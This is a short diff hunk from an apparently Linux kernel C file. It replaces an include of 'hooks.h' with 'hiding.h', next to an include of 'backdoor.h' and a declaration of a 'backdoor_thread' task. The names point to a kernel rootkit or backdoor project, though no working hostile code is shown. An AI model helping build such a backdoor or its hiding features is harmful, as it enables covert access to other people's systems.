@@ -10,7 +10,7 @@
 
 #include "config.h"
 #include "backdoor.h"
-#include "hooks.h"
+#include "hiding.h"
 
 struct task_struct* backdoor_thread;
 
